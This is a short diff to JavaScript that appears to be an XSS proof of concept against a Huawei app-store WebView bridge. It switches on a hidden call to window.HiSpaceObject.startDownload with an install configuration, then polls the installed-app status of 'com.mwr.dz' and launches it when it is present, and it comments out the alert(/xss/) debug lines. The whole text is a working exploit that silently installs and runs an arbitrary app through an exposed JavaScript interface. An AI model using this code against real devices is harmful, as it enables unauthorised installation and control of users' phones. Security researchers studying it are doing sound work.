@@ -29,17 +29,17 @@ var dataConfig = {
                     md5: "D8970855A11C1A90DC9722718AE51209"
                 }
             }
-//window.HiSpaceObject.startDownload(JSON.stringify(dataConfig.installInfo));
+window.HiSpaceObject.startDownload(JSON.stringify(dataConfig.installInfo));
 
 var int=setInterval("getappstatus();",500);
 function getappstatus() {
-  //var status= window.HiSpaceObject.getAppStatus("com.mwr.dz");
-  var status= window.HiSpaceObject.getAppStatus("com.huawei.securitymgr");
+  var status= window.HiSpaceObject.getAppStatus("com.mwr.dz");
+  //var status= window.HiSpaceObject.getAppStatus("com.huawei.securitymgr");
   if(status.indexOf("status\":0")>-1) {
     int=clearInterval(int);
-    alert(/xss/);
+    //alert(/xss/);
     window.HiSpaceObject.launchApp("com.mwr.dz",null,null);
-    alert(/xss2/);
+    //alert(/xss2/);
   }
   //alert(status);
 }
